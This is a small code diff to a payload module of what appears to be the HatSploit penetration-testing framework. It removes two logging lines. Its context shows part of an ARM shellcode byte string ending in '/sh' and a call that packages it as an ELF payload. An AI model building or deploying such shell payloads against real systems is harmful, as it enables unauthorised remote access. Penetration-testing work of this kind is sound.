@@ -51,7 +51,6 @@ class HatSploitPayload(Payload, HatVenom, TCPClient):
             'lport': local_port
         }
 
-        self.output_process("Generating shellcode...")
         shellcode = (
             b"\x01\x10\x8F\xE2"
             b"\x11\xFF\x2F\xE1"
@@ -74,7 +73,5 @@ class HatSploitPayload(Payload, HatVenom, TCPClient):
             b"\x2f\x73\x68\x00"
         )
 
-        self.output_process("Generating payload...")
         payload = self.generate('elf', 'armle', shellcode, offsets)
-
         return payload
